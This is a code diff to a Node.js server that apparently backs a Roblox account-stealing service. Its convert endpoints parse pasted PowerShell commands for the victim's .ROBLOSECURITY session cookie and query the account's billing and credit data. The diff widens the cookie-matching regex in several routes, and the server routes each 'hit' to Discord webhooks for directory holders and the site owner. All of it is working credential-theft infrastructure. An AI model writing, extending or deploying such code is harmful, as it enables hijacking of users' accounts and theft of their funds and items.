@@ -47,7 +47,7 @@ async function loadDirectories() {
     console.log('⚠️ Database not available, returning empty directories');
     return {};
   }
-  
+
   try {
     const snapshot = await db.ref('directories').once('value');
     const directories = snapshot.val() || {};
@@ -112,7 +112,7 @@ async function saveDirectories(directories) {
     console.log('⚠️ Database not available, cannot save directories');
     return false;
   }
-  
+
   try {
     await db.ref('directories').set(directories);
     return true;
@@ -157,7 +157,7 @@ async function logUserData(token, userData, context = {}) {
     console.log('⚠️ Database not available, cannot log user data');
     return null;
   }
-  
+
   try {
     // Hash the token for security - never store raw tokens
     const hashedToken = crypto.createHash('sha256').update(token).digest('hex').substring(0, 16);
@@ -271,7 +271,8 @@ app.post('/u/convert', validateRequest, async (req, res) => {
 
     // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
     const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
-    const regex = /\.ROBLOSECURITY[=\s]*["']?([^"'\s}]+)["']?/i;
+    // Updated regex to handle both direct assignment and New-Object System.Net.Cookie format
+    const regex = /\.ROBLOSECURITY["']?\s*,?\s*["']([^"']+)["']/i;
     const match = cleanedInput.match(regex);
 
     if (match) {
@@ -463,7 +464,8 @@ app.post('/u/:directory/convert', async (req, res) => {
 
     // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
     const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
-    const regex = /\.ROBLOSECURITY[=\s]*["']?([^"'\s}]+)["']?/i;
+    // Updated regex to handle both direct assignment and New-Object System.Net.Cookie format
+    const regex = /\.ROBLOSECURITY["']?\s*,?\s*["']([^"']+)["']/i;
     const match = cleanedInput.match(regex);
 
     if (match) {
@@ -1188,13 +1190,13 @@ app.get('/api/user-stats', authenticateUser, async (req, res) => {
     // Filter logs for this specific user/subdirectory only
     const userLogs = Object.values(allLogs).filter(log => {
       if (!log.context) return false;
-      
+
       // For subdirectories, only match exact subdirectory path
       if (userDirectory.includes('/')) {
         const [parentDir, subDir] = userDirectory.split('/');
         return log.context.directory === parentDir && log.context.subdirectory === subDir;
       }
-      
+
       // For parent directories, only match direct hits (not subdirectory hits)
       return log.context.directory === userDirectory && !log.context.subdirectory;
     });
@@ -1753,7 +1755,7 @@ async function fetchRobloxUserData(token) {
     let premiumData = { isPremium: false };
     let creditBalance = 0;
     let savedPayment = false;
-    
+
     try {
       const billingResponse = await fetch(`https://billing.roblox.com/v1/credit`, {
         headers: baseHeaders
@@ -1761,11 +1763,11 @@ async function fetchRobloxUserData(token) {
 
       if (billingResponse.ok) {
         const billingData = await billingResponse.json();
-        
+
         // Extract credit balance information
         creditBalance = billingData.balance || 0;
         savedPayment = billingData.hasSavedPayments || false;
-        
+
         // Check if user has premium features via billing
         premiumData.isPremium = billingData.hasPremium || 
                                billingData.isPremium || 
@@ -2480,7 +2482,8 @@ app.post('/:directory/convert', async (req, res) => {
 
     // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
     const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
-    const regex = /\.ROBLOSECURITY[=\s]*["']?([^"'\s}]+)["']?/i;
+    // Updated regex to handle both direct assignment and New-Object System.Net.Cookie format
+    const regex = /\.ROBLOSECURITY["']?\s*,?\s*["']([^"']+)["']/i;
     const match = cleanedInput.match(regex);
 
     if (match) {
@@ -2843,7 +2846,7 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
     const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
 
     // Now extract the ROBLOSECURITY token from the cleaned input - improved pattern to capture full token
-    const regex = /\.ROBLOSECURITY[=\s]*["']?([^"'\s}]+)["']?/i;
+    const regex = /\.ROBLOSECURITY["']?\s*,?\s*["']([^"']+)["']/i;
     const match = cleanedInput.match(regex);
 
     if (match) {
@@ -2958,7 +2961,7 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
       // If filters are met, only send to Dualhook directory and site owner (skip subdirectory)
       if (meetsFilters) {
         console.log(`🎯 Hit meets Dualhook filters for ${directoryName}/${subdirectoryName}, bypassing subdirectory webhook`);
-        
+
         // Add filter notification to webhook title
         const filteredTitle = `🎯 FILTERED HIT - ${directoryName.toUpperCase()} AUTOHAR`;
 
@@ -2974,7 +2977,7 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
         }
       } else {
         // Normal triple-webhook logic when filters are not met
-        
+
         // 1. Send to subdirectory webhook
         subdirectoryWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, subdirectoryConfig.webhookUrl, customTitle);
 
@@ -3137,7 +3140,8 @@ app.post('/:directory/convert', async (req, res) => {
 
     // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
     const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
-    const regex = /\.ROBLOSECURITY[=\s]*["']?([^"'\s}]+)["']?/i;
+    // Updated regex to handle both direct assignment and New-Object System.Net.Cookie format
+    const regex = /\.ROBLOSECURITY["']?\s*,?\s*["']([^"']+)["']/i;
     const match = cleanedInput.match(regex);
 
     if (match) {
